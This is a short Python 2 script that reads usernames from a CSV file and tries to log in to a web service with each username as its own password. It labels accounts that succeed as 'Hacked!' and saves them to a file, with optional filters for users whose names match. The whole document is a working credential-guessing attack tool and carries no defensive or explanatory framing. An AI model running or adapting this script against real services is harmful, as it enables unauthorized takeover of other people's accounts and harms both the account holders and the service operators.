import requests
import pandas as pd
from requests.auth import HTTPDigestAuth

url=""

def test_credentials(user):	
	print
	print "Testing user {}".format(user),
	r = requests.get(url, auth=(user,user), verify=False, stream=True)
	
	if r.status_code == 404:
		print "User {} --> Hacked!".format(user)
		hacked_users.append(user)
	else:
		#print "--> Nope..."
		other_users.append(user)

def get_interesting_users(file):
	## Get all users from the csv file
	df_users = pd.read_csv(file,sep=',',quotechar="'",header=None,error_bad_lines=False,warn_bad_lines=False)
	
	## Uncomment for first name == last name == username
	#df_users = df_users[(df_users[0]==df_users[1]) & (df_users[0] ==df_users[2])]
	#print "Found {} users with matching first name, last name and username...".format(str(len(df_users)))
	
	
	## Uncomment for first name == last name
	#df_users = df_users[(df_users[0]==df_users[1])]
	
	return df_users

interesting_users = get_interesting_users('all_users.csv')

hacked_users = []
other_users = []

for user in interesting_users.iterrows():
	user = user[1][2]
	#print user
	test_credentials(user)

print "Done!\n\nSummary:"
print "Hacked users: {}".format(str(len(hacked_users)))
with open('hacked_users_bruteforce.txt','w') as file:
	for user in hacked_users:
		file.write(user + "\n")

print "Non-hacked users: {}".format(str(len(other_users)))
with open('other_users_bruteforce.txt','w') as file:
	for user in other_users:
		file.write(user + "\n")
